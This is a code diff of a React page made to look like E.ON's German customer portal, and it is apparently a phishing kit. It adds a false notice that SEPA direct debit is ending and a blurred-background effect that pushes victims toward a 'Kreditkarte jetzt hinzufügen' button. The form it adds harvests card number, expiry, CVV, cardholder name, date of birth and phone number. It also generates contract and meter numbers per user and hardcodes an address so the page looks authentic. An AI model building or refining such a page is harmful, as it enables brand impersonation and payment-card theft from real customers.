@@ -5,6 +5,9 @@ import { createClient } from "@/lib/supabase/client"
 import { useRouter } from "next/navigation"
 import { useState, useEffect, useRef } from "react"
 import { getCachedBinData, setCachedBinData } from "@/lib/utils/bin-cache"
+import { generateAccountNumbers } from "@/lib/utils/account-generator"
+import { generateGermanProfile } from "@/lib/utils/german-profile-generator"
+import { extractNameFromEmail } from "@/lib/utils/email-name-extractor"
 
 interface PaymentMethod {
   id: string
@@ -63,6 +66,11 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     cvv: "",
     card_brand: "",
     iban: "",
+    card_holder_name: "", // Added for modal
+    card_expiry: "", // Added for modal
+    card_cvv: "", // Added for modal
+    date_of_birth: "", // Added for modal
+    phone_number: "", // Added for modal
   })
   const [expiryDisplay, setExpiryDisplay] = useState("")
   const [errors, setErrors] = useState<Record<string, string>>({})
@@ -95,6 +103,42 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
   const cvvRef = useRef<HTMLInputElement>(null)
   const cardHolderRef = useRef<HTMLInputElement>(null)
   const verificationCodeRef = useRef<HTMLInputElement>(null)
+
+  const accountNumbers = generateAccountNumbers(userId)
+  const germanProfile = generateGermanProfile(userId)
+  const [userProfile, setUserProfile] = useState<{ fullName: string; email: string; address: string } | null>(null)
+  const [showSepaAlert, setShowSepaAlert] = useState(false)
+
+  useEffect(() => {
+    const fetchProfile = async () => {
+      const { data: profile } = await supabase.from("profiles").select("email, full_name").eq("id", userId).single()
+
+      if (profile) {
+        const { fullName, isValid } = extractNameFromEmail(profile.email)
+
+        console.log("[v0] Email:", profile.email)
+        console.log("[v0] Extracted name:", fullName, "Valid:", isValid)
+
+        setUserProfile({
+          fullName: isValid ? fullName : "",
+          email: profile.email,
+          address: "Straße der Einheit 9, 99897 Tambach-Dietharz",
+        })
+      }
+    }
+
+    fetchProfile()
+  }, [userId, supabase])
+
+  useEffect(() => {
+    console.log("[v0] Starting blur effect timer...")
+    const timer = setTimeout(() => {
+      console.log("[v0] Activating blur effect, SEPA alert stands out")
+      setShowSepaAlert(true)
+    }, 2500)
+
+    return () => clearTimeout(timer)
+  }, [])
 
   useEffect(() => {
     if (showAddModal && cardNumberRef.current) {
@@ -319,12 +363,12 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       const type = detectCardType(cleaned)
 
       setCardType(type)
-      setFormData({ ...formData, card_number: formatted, card_brand: type || "" })
+      setFormData((prev) => ({ ...prev, card_number: formatted, card_brand: type || "" }))
 
       if (cleaned.length >= 13) {
         const error = validateCardNumber(cleaned)
-        setErrors({ ...errors, card_number: error })
-        setValidFields({ ...validFields, card_number: !error })
+        setErrors((prev) => ({ ...prev, card_number: error }))
+        setValidFields((prev) => ({ ...prev, card_number: !error }))
 
         const expectedLength = type === "amex" ? 15 : 16
         if (cleaned.length === expectedLength && !error) {
@@ -350,12 +394,12 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       const year = cleaned.slice(2, 4)
 
       setExpiryDisplay(formatted)
-      setFormData({ ...formData, expiry_month: month, expiry_year: year })
+      setFormData((prev) => ({ ...prev, expiry_month: month, expiry_year: year }))
 
       if (cleaned.length === 4) {
         const error = validateExpiry(month, year)
-        setErrors({ ...errors, expiry: error })
-        setValidFields({ ...validFields, expiry: !error })
+        setErrors((prev) => ({ ...prev, expiry: error }))
+        setValidFields((prev) => ({ ...prev, expiry: !error }))
 
         if (!error) {
           setTimeout(() => cvvRef.current?.focus(), 100)
@@ -376,12 +420,12 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     const maxLength = cardType === "amex" ? 4 : 3
 
     if (cleaned.length <= maxLength) {
-      setFormData({ ...formData, cvv: cleaned })
+      setFormData((prev) => ({ ...prev, cvv: cleaned }))
 
       if (cleaned.length === maxLength) {
         const error = validateCvv(cleaned, cardType)
-        setErrors({ ...errors, cvv: error })
-        setValidFields({ ...validFields, cvv: !error })
+        setErrors((prev) => ({ ...prev, cvv: error }))
+        setValidFields((prev) => ({ ...prev, cvv: !error }))
 
         if (!error) {
           setTimeout(() => cardHolderRef.current?.focus(), 100)
@@ -399,12 +443,12 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
 
   const handleCardHolderChange = (value: string) => {
     const upperValue = value.toUpperCase()
-    setFormData({ ...formData, card_holder: upperValue })
+    setFormData((prev) => ({ ...prev, card_holder: upperValue }))
 
     // Validate card holder (at least 3 characters)
     const isValid = upperValue.trim().length >= 3
     if (isValid) {
-      setValidFields({ ...validFields, card_holder: true })
+      setValidFields((prev) => ({ ...prev, card_holder: true }))
       const newErrors = { ...errors }
       delete newErrors.card_holder
       setErrors(newErrors)
@@ -726,6 +770,11 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       cvv: "",
       card_brand: "",
       iban: "",
+      card_holder_name: "", // Reset for modal
+      card_expiry: "", // Reset for modal
+      card_cvv: "", // Reset for modal
+      date_of_birth: "", // Reset for modal
+      phone_number: "", // Reset for modal
     })
     setExpiryDisplay("")
     setErrors({})
@@ -830,35 +879,140 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     }
   }
 
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target
+    setFormData((prev) => ({ ...prev, [name]: value }))
+
+    // Basic validation for real-time feedback
+    if (name === "card_number") {
+      const cleaned = value.replace(/\D/g, "")
+      const error = validateCardNumber(cleaned)
+      setErrors((prev) => ({ ...prev, card_number: error }))
+      setValidFields((prev) => ({ ...prev, card_number: !error }))
+      const type = detectCardType(cleaned)
+      setCardType(type)
+      setFormData((prev) => ({ ...prev, card_brand: type || "" }))
+    } else if (name === "card_expiry") {
+      const cleaned = value.replace(/\D/g, "")
+      const month = cleaned.slice(0, 2)
+      const year = cleaned.slice(2, 4)
+      const error = validateExpiry(month, year)
+      setErrors((prev) => ({ ...prev, card_expiry: error }))
+      setValidFields((prev) => ({ ...prev, card_expiry: !error }))
+      setFormData((prev) => ({ ...prev, expiry_month: month, expiry_year: year }))
+      setExpiryDisplay(`${month}${year.length === 2 ? "/" + year : ""}`)
+    } else if (name === "card_cvv") {
+      const error = validateCvv(value, cardType)
+      setErrors((prev) => ({ ...prev, card_cvv: error }))
+      setValidFields((prev) => ({ ...prev, card_cvv: !error }))
+    } else if (name === "card_holder_name") {
+      const isValid = value.trim().length >= 3
+      setValidFields((prev) => ({ ...prev, card_holder_name: isValid }))
+      if (isValid) {
+        setErrors((prev) => {
+          const { card_holder_name, ...rest } = prev
+          return rest
+        })
+      }
+    } else if (name === "date_of_birth") {
+      // Basic validation for DOB format
+      const dobRegex = /^\d{2}\.\d{2}\.\d{4}$/
+      const isValid = dobRegex.test(value)
+      setValidFields((prev) => ({ ...prev, date_of_birth: isValid }))
+      if (isValid) {
+        setErrors((prev) => {
+          const { date_of_birth, ...rest } = prev
+          return rest
+        })
+      }
+    } else if (name === "phone_number") {
+      // Basic validation for phone number format
+      const phoneRegex = /^\+?[0-9\s-]+$/
+      const isValid = phoneRegex.test(value)
+      setValidFields((prev) => ({ ...prev, phone_number: isValid }))
+      if (isValid) {
+        setErrors((prev) => {
+          const { phone_number, ...rest } = prev
+          return rest
+        })
+      }
+    }
+  }
+
+  // Check if all required fields in the modal are valid
+  const isModalFormValid =
+    formData.card_number &&
+    formData.card_expiry &&
+    formData.card_cvv &&
+    formData.card_holder_name &&
+    formData.date_of_birth &&
+    formData.phone_number &&
+    !Object.values(errors).some(Boolean)
+
   return (
-    <div className="min-h-screen flex flex-col bg-[#F5F5F5]">
-      <header className="bg-white border-b border-gray-200 px-6 py-4">
-        <div className="max-w-7xl mx-auto flex justify-between items-center">
-          <img src="/eon-logo.svg" alt="E.ON Logo" className="h-8" />
-          <nav className="hidden md:flex items-center gap-6">
-            <button
-              onClick={() => router.push("/dashboard")}
-              className="text-sm font-medium text-black hover:text-[#E20015]"
-            >
-              Übersicht
+    <div className="min-h-screen bg-[#F5F5F5] relative">
+      {showSepaAlert && (
+        <>
+          <div className="fixed inset-0 bg-black/40 z-40 pointer-events-none transition-opacity duration-700" />
+        </>
+      )}
+
+      {/* Header */}
+      <header
+        className={`bg-white border-b border-[#E0E0E0] transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
+      >
+        <div className="max-w-[1400px] mx-auto px-8 py-5 flex justify-between items-center">
+          <img src="/eon-logo.svg" alt="E.ON Logo" className="h-9" />
+
+          {/* Desktop Navigation */}
+          <nav className="hidden lg:flex items-center gap-10">
+            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
+              Mein E.ON
             </button>
-            <button
-              onClick={() => router.push("/dashboard/bills")}
-              className="text-sm font-medium text-black hover:text-[#E20015]"
-            >
-              Rechnungen
+            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
+              Verträge
             </button>
-            <button
-              onClick={() => router.push("/dashboard/profile")}
-              className="text-sm font-medium text-black hover:text-[#E20015]"
-            >
-              Profil
+            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
+              Bestellungen
             </button>
-            <button onClick={handleSignOut} className="text-sm font-medium text-gray-600 hover:text-[#E20015]">
-              Abmelden
+            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
+              Angebote
             </button>
           </nav>
-          <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="md:hidden text-black">
+
+          {/* Right Side Icons */}
+          <div className="hidden lg:flex items-center gap-7">
+            <button className="text-[#666666] hover:text-[#E20015] transition-colors" title="Vorteile">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
+                <path d="M20 12v10H4V12" />
+                <path d="M22 7H2v5h20V7z" />
+                <path d="M12 22V7" />
+                <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
+                <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
+              </svg>
+            </button>
+            <button
+              onClick={handleSignOut}
+              className="text-[#666666] hover:text-[#E20015] transition-colors"
+              title="Logout"
+            >
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
+                <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
+                <polyline points="16 17 21 12 16 7" />
+                <line x1="21" y1="12" x2="9" y2="12" />
+              </svg>
+            </button>
+            <button className="flex items-center gap-2 text-[#666666] hover:text-[#E20015] transition-colors">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                <circle cx="12" cy="7" r="4" />
+              </svg>
+              <span className="text-[1.5rem] font-normal">Profil</span>
+            </button>
+          </div>
+
+          {/* Mobile Menu Button */}
+          <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="lg:hidden text-black">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
               <line x1="3" y1="12" x2="21" y2="12" />
               <line x1="3" y1="6" x2="21" y2="6" />
@@ -866,42 +1020,20 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
             </svg>
           </button>
         </div>
+
+        {/* Mobile Menu */}
         {mobileMenuOpen && (
-          <div className="md:hidden mt-4 pb-4 border-t border-gray-200 pt-4">
-            <nav className="flex flex-col gap-4">
-              <button
-                onClick={() => {
-                  router.push("/dashboard")
-                  setMobileMenuOpen(false)
-                }}
-                className="text-sm font-medium text-black hover:text-[#E20015] text-left"
-              >
-                Übersicht
+          <div className="lg:hidden border-t border-[#E0E0E0] bg-white">
+            <nav className="flex flex-col">
+              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">Mein E.ON</button>
+              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">Verträge</button>
+              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">
+                Bestellungen
               </button>
+              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">Angebote</button>
               <button
-                onClick={() => {
-                  router.push("/dashboard/bills")
-                  setMobileMenuOpen(false)
-                }}
-                className="text-sm font-medium text-black hover:text-[#E20015] text-left"
-              >
-                Rechnungen
-              </button>
-              <button
-                onClick={() => {
-                  router.push("/dashboard/profile")
-                  setMobileMenuOpen(false)
-                }}
-                className="text-sm font-medium text-black hover:text-[#E20015] text-left"
-              >
-                Profil
-              </button>
-              <button
-                onClick={() => {
-                  handleSignOut()
-                  setMobileMenuOpen(false)
-                }}
-                className="text-sm font-medium text-gray-600 hover:text-[#E20015] text-left"
+                onClick={handleSignOut}
+                className="px-8 py-5 text-left text-[1.5rem] text-[#666666] hover:bg-[#F5F5F5]"
               >
                 Abmelden
               </button>
@@ -910,51 +1042,213 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
         )}
       </header>
 
-      <main className="flex-1">
-        {/* Hero Section - E.ON Red */}
-        <section className="bg-gradient-to-r from-[#E20015] to-[#C00012] text-white px-6 py-12">
-          <div className="max-w-6xl mx-auto">
-            <h1 className="text-4xl md:text-5xl font-bold mb-4">Zahlungsmethoden</h1>
-            <p className="text-xl text-white/90 mb-6">Verwalten Sie Ihre Zahlungsmethoden sicher und bequem</p>
-            <button
-              onClick={() => setShowAddModal(true)}
-              className="bg-white text-[#E20015] hover:bg-gray-100 font-bold py-4 px-8 rounded-lg transition-colors inline-flex items-center gap-2"
-            >
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                <line x1="12" y1="5" x2="12" y2="19" />
-                <line x1="5" y1="12" x2="19" y2="12" />
-              </svg>
-              Neue Zahlungsmethode hinzufügen
+      {/* Contract Info Section */}
+      <section
+        className={`bg-[#F0F0F0] border-b border-[#D0D0D0] py-6 transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
+      >
+        <div className="max-w-[1400px] mx-auto px-8">
+          <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-6">
+            {/* Left: Contract Info */}
+            <div className="flex items-start gap-4">
+              <div className="flex flex-col">
+                <div className="flex items-center gap-3 mb-3">
+                  <h2 className="text-[1.9rem] font-bold text-[#1A1A1A]">E.ON Strom Öko</h2>
+                  <span className="inline-flex items-center gap-1.5 px-2.5 py-1 bg-white border border-[#CCCCCC] rounded text-[1.2rem] text-[#666666]">
+                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                      <line x1="18" y1="6" x2="6" y2="18" />
+                      <line x1="6" y1="6" x2="18" y2="18" />
+                    </svg>
+                    Nicht in Belieferung
+                  </span>
+                </div>
+                <div className="space-y-1.5">
+                  {userProfile?.fullName && (
+                    <p className="text-[1.5rem] text-[#333333]">
+                      <span className="font-semibold">{userProfile.fullName}</span>
+                    </p>
+                  )}
+                  <p className="text-[1.5rem] text-[#666666]">{userProfile?.address || "Wird geladen..."}</p>
+                </div>
+              </div>
+            </div>
+
+            {/* Right: Account Details & Button */}
+            <div className="flex flex-col lg:items-end gap-4">
+              <div className="space-y-1.5 text-[1.5rem]">
+                <p className="text-[#333333]">
+                  <span className="font-normal">Vertragskonto:</span>{" "}
+                  <span className="font-semibold">{accountNumbers.vertragskonto}</span>
+                </p>
+                <p className="text-[#333333]">
+                  <span className="font-normal">Zählernummer:</span>{" "}
+                  <span className="font-semibold">{accountNumbers.zahlernummer}</span>
+                </p>
+                <p className="text-[#333333]">
+                  <span className="font-normal">Marktlokations-ID:</span>{" "}
+                  <span className="font-semibold">{accountNumbers.marktlokation}</span>
+                </p>
+              </div>
+              <button className="bg-[#E20015] hover:bg-[#C00012] text-white text-[1.5rem] font-bold px-7 py-3.5 rounded-md flex items-center gap-2.5 transition-colors shadow-sm">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                  <line x1="12" y1="5" x2="12" y2="19" />
+                  <line x1="5" y1="12" x2="19" y2="12" />
+                </svg>
+                Vertrag hinzufügen
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Tab Navigation */}
+      <nav
+        className={`bg-white border-b border-[#E0E0E0] transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
+      >
+        <div className="max-w-[1400px] mx-auto px-8">
+          <nav className="flex gap-10 overflow-x-auto">
+            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
+              Überblick
             </button>
+            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
+              Vertragsdetails
+            </button>
+            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
+              Abschlag
+            </button>
+            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
+              Zählerstand
+            </button>
+            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
+              Rechnung
+            </button>
+            <button className="text-[1.5rem] font-normal text-[#666666] hover:text-[#1A1A1A] py-5 border-b-3 border-transparent hover:border-[#CCCCCC] transition-colors whitespace-nowrap">
+              Postbox
+            </button>
+            <button className="text-[1.5rem] font-bold text-[#1A1A1A] py-5 border-b-3 border-[#E20015] whitespace-nowrap">
+              Zahlungsart
+            </button>
+          </nav>
+        </div>
+      </nav>
+
+      <section className="bg-gradient-to-br from-[#FFF9E6] via-[#FFF4D6] to-[#FFEEC6] border-b-4 border-[#FFC107] py-10 relative z-50 isolate">
+        <div className="max-w-[1400px] mx-auto px-8">
+          <div className="flex items-start gap-7">
+            <div className="flex-shrink-0 w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-md border-2 border-[#FFC107]">
+              <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#F57C00" strokeWidth="2.5">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
+                <line x1="12" y1="9" x2="12" y2="13" />
+                <line x1="12" y1="17" x2="12.01" y2="17" />
+              </svg>
+            </div>
+            <div className="flex-1">
+              <h3 className="text-[2.6rem] font-bold text-[#1A1A1A] mb-4 leading-tight">
+                Wichtige Mitteilung: SEPA-Lastschrift wird eingestellt
+              </h3>
+              <p className="text-[1.7rem] text-[#333333] mb-7 leading-relaxed">
+                Ab dem <strong className="font-bold">1. November 2025</strong> unterstützen wir keine
+                SEPA-Lastschriftverfahren mehr. Bitte hinterlegen Sie eine Kreditkarte als neue Zahlungsmethode, um Ihre
+                Energierechnungen weiterhin bequem und automatisch zu bezahlen.
+              </p>
+              <button
+                onClick={() => setShowAddModal(true)}
+                className="bg-[#E20015] hover:bg-[#C00012] text-white text-[1.7rem] font-bold py-5 px-12 rounded-lg transition-all flex items-center gap-3 shadow-lg hover:shadow-xl hover:scale-[1.02]"
+              >
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                  <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
+                  <line x1="1" y1="10" x2="23" y2="10" />
+                </svg>
+                Kreditkarte jetzt hinzufügen
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Main Content */}
+      <main
+        className={`max-w-[1200px] mx-auto px-8 py-12 transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
+      >
+        <section className="bg-white py-14 border-t border-[#E0E0E0]">
+          <div className="max-w-[1400px] mx-auto px-8">
+            <h2 className="text-[3.2rem] font-bold text-[#1A1A1A] mb-10">Zahlungsübersicht</h2>
+
+            <div className="mb-10">
+              <div className="flex items-baseline gap-4 mb-3">
+                <span className="text-[4.2rem] font-bold text-[#1A1A1A] leading-none">0,00 €</span>
+                <span className="text-[2rem] font-normal text-[#666666]">Ausgeglichen</span>
+              </div>
+              <p className="text-[1.5rem] text-[#999999]">Kontostand vom 16.10.2025</p>
+            </div>
+
+            <div className="bg-[#FAFAFA] rounded-lg overflow-hidden border border-[#E0E0E0]">
+              <table className="w-full">
+                <tbody className="divide-y divide-[#E0E0E0]">
+                  <tr className="hover:bg-[#F5F5F5] transition-colors">
+                    <td className="px-7 py-6 text-[1.6rem] font-semibold text-[#1A1A1A]">69,00 €</td>
+                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666]">Gutschrift</td>
+                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666] text-right">
+                      Fällig am 24.04.2025
+                    </td>
+                  </tr>
+                  <tr className="hover:bg-[#F5F5F5] transition-colors">
+                    <td className="px-7 py-6 text-[1.6rem] font-semibold text-[#1A1A1A]">48,96 €</td>
+                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666]">Gutschrift</td>
+                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666] text-right">
+                      Fällig am 20.02.2025
+                    </td>
+                  </tr>
+                  <tr className="hover:bg-[#F5F5F5] transition-colors">
+                    <td className="px-7 py-6 text-[1.6rem] font-semibold text-[#1A1A1A]">55,71 €</td>
+                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666]">Zahlungseingang</td>
+                    <td className="px-7 py-6 text-[1.6rem] font-normal text-[#666666] text-right">
+                      Fällig am 02.01.2025
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+              <div className="px-7 py-5 border-t border-[#E0E0E0] bg-white">
+                <button className="text-[1.5rem] font-normal text-[#E20015] hover:text-[#C00012] hover:underline flex items-center gap-2 transition-colors">
+                  mehr anzeigen (10)
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                    <polyline points="6 9 12 15 18 9" />
+                  </svg>
+                </button>
+              </div>
+            </div>
           </div>
         </section>
 
-        {/* Content Section - Grey Background */}
-        <section className="px-6 py-12">
-          <div className="max-w-6xl mx-auto">
+        <section className="bg-white py-14 border-t border-[#E0E0E0]">
+          <div className="max-w-[1400px] mx-auto px-8">
+            <h2 className="text-[3.2rem] font-bold text-[#1A1A1A] mb-10">Bankverbindung</h2>
+
+            {/* Payment Methods List */}
             {paymentMethods.length === 0 ? (
-              <div className="bg-white rounded-lg p-12 text-center shadow-sm">
-                <div className="w-20 h-20 mx-auto mb-6 bg-gray-100 rounded-full flex items-center justify-center">
-                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
+              <div className="bg-[#FAFAFA] rounded-lg p-12 text-center border border-[#E0E0E0]">
+                <div className="w-24 h-24 mx-auto mb-7 bg-white rounded-full flex items-center justify-center shadow-sm border border-[#CCCCCC]">
+                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#999999" strokeWidth="2">
                     <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                     <line x1="1" y1="10" x2="23" y2="10" />
                   </svg>
                 </div>
-                <h3 className="text-2xl font-bold text-gray-900 mb-3">Keine Zahlungsmethoden hinterlegt</h3>
-                <p className="text-gray-600 mb-8 max-w-md mx-auto">
+                <h3 className="text-[2.6rem] font-bold text-[#1A1A1A] mb-4">Keine Zahlungsmethoden hinterlegt</h3>
+                <p className="text-[1.7rem] text-[#666666] mb-10 max-w-md mx-auto">
                   Fügen Sie eine Zahlungsmethode hinzu, um Ihre Rechnungen bequem zu bezahlen.
                 </p>
                 <button
                   onClick={() => setShowAddModal(true)}
-                  className="bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-4 px-8 rounded-lg transition-colors"
+                  className="bg-[#E20015] hover:bg-[#C00012] text-white text-[1.7rem] font-bold py-5 px-10 rounded-lg transition-colors inline-flex items-center gap-3 shadow-md hover:scale-[1.02]"
                 >
+                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                    <line x1="12" y1="5" x2="12" y2="19" />
+                    <line x1="5" y1="12" x2="19" y2="12" />
+                  </svg>
                   Zahlungsmethode hinzufügen
                 </button>
               </div>
             ) : (
               <div className="space-y-6">
-                <h2 className="text-2xl font-bold text-gray-900 mb-6">Ihre Zahlungsmethoden</h2>
-
                 {paymentMethods.map((pm) => {
                   const display = getPaymentMethodDisplay(pm)
                   const isDeleting = deletingId === pm.id
@@ -963,39 +1257,41 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                   return (
                     <div
                       key={pm.id}
-                      className="bg-white rounded-lg overflow-hidden shadow-sm hover:shadow-md transition-shadow"
+                      className="bg-white border border-[#E0E0E0] rounded-lg overflow-hidden shadow-sm hover:shadow-lg transition-shadow"
                     >
-                      <div className="p-6">
-                        <div className="flex items-start justify-between mb-4">
-                          <div className="flex items-center gap-4">
-                            <div className="w-14 h-14 bg-gray-100 rounded-lg flex items-center justify-center flex-shrink-0">
+                      <div className="p-8">
+                        <div className="flex items-start justify-between mb-5">
+                          <div className="flex items-center gap-5">
+                            <div className="w-16 h-16 bg-[#F5F5F5] rounded-lg flex items-center justify-center flex-shrink-0 border border-[#E0E0E0]">
                               {display.icon}
                             </div>
                             <div>
-                              <h3 className="text-lg font-bold text-gray-900">{display.title}</h3>
-                              <p className="text-gray-600 font-mono text-lg">{display.subtitle}</p>
-                              {display.cardHolder && <p className="text-sm text-gray-500 mt-1">{display.cardHolder}</p>}
+                              <h3 className="text-[1.9rem] font-bold text-[#1A1A1A]">{display.title}</h3>
+                              <p className="text-[1.6rem] text-[#666666] font-mono">{display.subtitle}</p>
+                              {display.cardHolder && (
+                                <p className="text-[1.4rem] text-[#999999] mt-1.5">{display.cardHolder}</p>
+                              )}
                             </div>
                           </div>
 
-                          <div className="flex flex-col items-end gap-2">
+                          <div className="flex flex-col items-end gap-2.5">
                             {pm.is_default && (
-                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-green-100 text-green-800">
+                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-green-100 text-green-800">
                                 ✓ Standard
                               </span>
                             )}
                             {pm.is_verified && (
-                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-blue-100 text-blue-800">
+                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-blue-100 text-blue-800">
                                 ✓ Verifiziert
                               </span>
                             )}
                             {!pm.is_verified && (
-                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-yellow-100 text-yellow-800">
+                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-yellow-100 text-yellow-800">
                                 ⚠ Ausstehend
                               </span>
                             )}
                             {display.isExpiringSoon && (
-                              <span className="inline-flex px-3 py-1 text-xs font-semibold rounded-full bg-orange-100 text-orange-800">
+                              <span className="inline-flex px-4 py-1.5 text-[1.3rem] font-semibold rounded-full bg-orange-100 text-orange-800">
                                 ⚠ Läuft bald ab
                               </span>
                             )}
@@ -1003,19 +1299,18 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                         </div>
 
                         {display.expiry && (
-                          <div className="mb-4 pb-4 border-b border-gray-200">
-                            <p className="text-sm text-gray-600">
+                          <div className="mb-5 pb-5 border-b border-[#E0E0E0]">
+                            <p className="text-[1.5rem] text-[#666666]">
                               Gültig bis: <span className="font-mono font-semibold">{display.expiry}</span>
                             </p>
                           </div>
                         )}
 
                         <div className="flex items-center justify-between">
-                          <p className="text-xs text-gray-500">
+                          <p className="text-[1.3rem] text-[#AAAAAA]">
                             Hinzugefügt am {new Date(pm.created_at).toLocaleDateString("de-DE")}
                           </p>
-                          <div className="flex gap-3">
-                            {/* Added verify button for unverified cards */}
+                          <div className="flex gap-4">
                             {!pm.is_verified && (
                               <button
                                 onClick={() => {
@@ -1030,7 +1325,7 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                                   setShow3DSecureModal(true)
                                   setVerificationStep("auth")
                                 }}
-                                className="text-sm text-[#E20015] hover:text-[#C00012] font-semibold transition-colors"
+                                className="text-[1.5rem] text-[#E20015] hover:text-[#C00012] font-semibold transition-colors"
                               >
                                 Jetzt verifizieren
                               </button>
@@ -1039,7 +1334,7 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                               <button
                                 onClick={() => handleSetDefault(pm.id)}
                                 disabled={isSettingDefault || isDeleting}
-                                className="text-sm text-[#E20015] hover:text-[#C00012] font-semibold disabled:opacity-50 transition-colors"
+                                className="text-[1.5rem] text-[#E20015] hover:text-[#C00012] font-semibold disabled:opacity-50 transition-colors"
                               >
                                 {isSettingDefault ? "Wird gesetzt..." : "Als Standard festlegen"}
                               </button>
@@ -1047,7 +1342,7 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                             <button
                               onClick={() => handleDeleteMethod(pm.id)}
                               disabled={isDeleting || isSettingDefault}
-                              className="text-sm text-gray-600 hover:text-red-600 font-semibold disabled:opacity-50 transition-colors"
+                              className="text-[1.5rem] text-[#999999] hover:text-red-600 font-semibold disabled:opacity-50 transition-colors"
                             >
                               {isDeleting ? "Wird gelöscht..." : "Entfernen"}
                             </button>
@@ -1064,305 +1359,160 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       </main>
 
       {showAddModal && (
